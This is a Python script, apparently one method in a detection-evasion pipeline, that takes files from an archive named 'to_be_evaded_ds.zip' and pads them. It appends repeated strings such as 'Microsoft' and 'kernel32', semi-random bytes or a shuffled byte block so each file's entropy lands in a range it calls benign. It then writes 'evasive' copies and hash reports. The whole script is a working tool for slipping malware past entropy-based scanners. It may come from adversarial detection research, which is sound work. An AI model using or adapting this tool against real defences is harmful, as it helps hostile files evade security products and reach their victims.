#!/usr/bin/env python3
"""
Method 7 - Entropy Adjustment Attack

通过调整文件熵值来绕过基于熵的检测：
1. 添加/移除高熵或低熵数据
2. 平衡字节分布
3. 添加重复模式来降低熵值
"""

import argparse
import csv
import hashlib
import random
import shutil
import time
import zipfile
from pathlib import Path
import math


METHOD_NAME = "method7_entropy_adjustment"
DEFAULT_ARCHIVE = Path(__file__).resolve().parents[1] / "to_be_evaded_ds.zip"
DEFAULT_WORK_ROOT = Path(__file__).resolve().parent / "artifacts" / METHOD_NAME
DEFAULT_OUTPUT_ZIP = Path(__file__).resolve().parent / f"{METHOD_NAME}_outputs.zip"


def extract_dataset(archive_path: Path, destination: Path) -> None:
    if not archive_path.exists():
        raise FileNotFoundError(f"input archive not found: {archive_path}")
    if destination.exists():
        shutil.rmtree(destination)
    destination.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(archive_path, "r") as zf:
        zf.extractall(destination)


def compress_outputs(source_dir: Path, archive_path: Path) -> None:
    archive_path.parent.mkdir(parents=True, exist_ok=True)
    if archive_path.exists():
        archive_path.unlink()
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for path in sorted(source_dir.rglob("*")):
            if path.is_file():
                zf.write(path, path.relative_to(source_dir))


def collect_inputs(input_root: Path):
    return sorted(
        p
        for p in input_root.rglob("*")
        if p.is_file() and p.name != "sha256sums.txt"
    )


def sha256_of(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


def calculate_entropy(data: bytes) -> float:
    """计算字节数据的熵值"""
    if not data:
        return 0.0
    
    entropy = 0.0
    for x in range(256):
        p_x = float(data.count(bytes([x]))) / len(data)
        if p_x > 0:
            entropy += -p_x * math.log2(p_x)
    return entropy


def adjust_entropy(src: Path, dst: Path) -> bool:
    """
    通过添加数据来调整熵值，使其更接近良性样本
    """
    try:
        data = bytearray(src.read_bytes())
        orig_entropy = calculate_entropy(data)
        
        # 目标：将熵值调整到良性范围（通常3.5-6.5）
        target_entropy = random.uniform(4.0, 6.0)
        
        # 策略1: 如果熵值太高，添加重复模式来降低
        if orig_entropy > 7.0:
            # 添加大量重复的良性字符串
            low_entropy_data = bytearray()
            patterns = [
                b"Microsoft\x00",
                b"Windows\x00",
                b"Copyright\x00",
                b"All rights reserved\x00",
            ]
            
            for _ in range(random.randint(50000, 200000)):
                low_entropy_data.extend(random.choice(patterns))
            
            max_append = min(2_000_000, 5_000_000 - len(data))
            data.extend(low_entropy_data[:max_append])
        
        # 策略2: 如果熵值太低，添加一些随机但受控的数据
        elif orig_entropy < 4.0:
            # 添加中等熵值的数据（部分随机，部分重复）
            medium_entropy_data = bytearray()
            for _ in range(random.randint(100000, 500000)):
                if random.random() < 0.3:  # 30%随机
                    medium_entropy_data.append(random.randint(0, 255))
                else:  # 70%重复模式
                    medium_entropy_data.extend(random.choice([
                        b"kernel32", b"user32", b"ntdll", b"msvcrt"
                    ]))
            
            max_append = min(2_000_000, 5_000_000 - len(data))
            data.extend(medium_entropy_data[:max_append])
        
        # 策略3: 添加平衡的字节分布（使直方图更均匀）
        balanced_data = bytearray()
        # 创建一个更均匀的字节分布
        for byte_val in range(256):
            count = random.randint(100, 1000)
            balanced_data.extend(bytes([byte_val]) * count)
        
        # 随机打乱
        balanced_list = list(balanced_data)
        random.shuffle(balanced_list)
        balanced_data = bytearray(balanced_list)
        
        max_append = min(1_000_000, 5_000_000 - len(data))
        data.extend(balanced_data[:max_append])
        
        # 写入文件
        final_data = bytes(data)
        dst.write_bytes(final_data)
        
        new_entropy = calculate_entropy(final_data)
        print(f"    Entropy: {orig_entropy:.2f} -> {new_entropy:.2f}, size: {len(final_data):,} bytes")
        return True
        
    except Exception as e:
        print(f"    Entropy adjustment failed: {e}")
        # Fallback: 简单overlay
        try:
            data = src.read_bytes()
            overlay = b"Microsoft Corporation\x00" * 50000
            max_overlay = min(2_000_000, 5_000_000 - len(data))
            final_data = data + overlay[:max_overlay]
            dst.write_bytes(final_data)
            return True
        except:
            return False


def main():
    parser = argparse.ArgumentParser(description=f"{METHOD_NAME} attack pipeline")
    parser.add_argument("--archive", type=Path, default=DEFAULT_ARCHIVE,
                        help="Input archive path")
    parser.add_argument("--output", type=Path, default=DEFAULT_OUTPUT_ZIP,
                        help="Output zip path")
    parser.add_argument("--work-dir", type=Path, default=DEFAULT_WORK_ROOT,
                        help="Working directory")
    
    args = parser.parse_args()
    
    print(f"=== {METHOD_NAME.upper()} ===")
    print(f"Input: {args.archive}")
    print(f"Output: {args.output}")
    print(f"Work dir: {args.work_dir}")
    
    # Extract
    input_dir = args.work_dir / "input"
    output_dir = args.work_dir / "output"
    extract_dataset(args.archive, input_dir)
    
    # Process
    inputs = collect_inputs(input_dir)
    print(f"\nProcessing {len(inputs)} files...")
    
    output_dir.mkdir(parents=True, exist_ok=True)
    report_rows = []
    sha256_list = []
    
    for src_path in inputs:
        dst_path = output_dir / src_path.name
        print(f"\n[{src_path.name}]")
        
        start_time = time.time()
        success = adjust_entropy(src_path, dst_path)
        elapsed = time.time() - start_time
        
        if success and dst_path.exists():
            orig_hash = sha256_of(src_path)
            new_hash = sha256_of(dst_path)
            report_rows.append({
                'original': src_path.name,
                'evasive': dst_path.name,
                'original_sha256': orig_hash,
                'evasive_sha256': new_hash,
                'success': True,
                'time_seconds': f"{elapsed:.2f}"
            })
            sha256_list.append(new_hash)
        else:
            report_rows.append({
                'original': src_path.name,
                'evasive': '',
                'original_sha256': sha256_of(src_path),
                'evasive_sha256': '',
                'success': False,
                'time_seconds': f"{elapsed:.2f}"
            })
    
    # Write reports
    report_csv = output_dir / "compare_report.csv"
    with open(report_csv, 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=['original', 'evasive', 'original_sha256', 'evasive_sha256', 'success', 'time_seconds'])
        writer.writeheader()
        writer.writerows(report_rows)
    
    sha256_txt = output_dir / "sha256sums.txt"
    with open(sha256_txt, 'w') as f:
        f.write('\n'.join(sha256_list))
    
    # Compress
    compress_outputs(output_dir, args.output)
    print(f"\n=== Complete ===")
    print(f"Output: {args.output}")
    print(f"Success: {sum(1 for r in report_rows if r['success'])}/{len(report_rows)}")


if __name__ == "__main__":
    main()

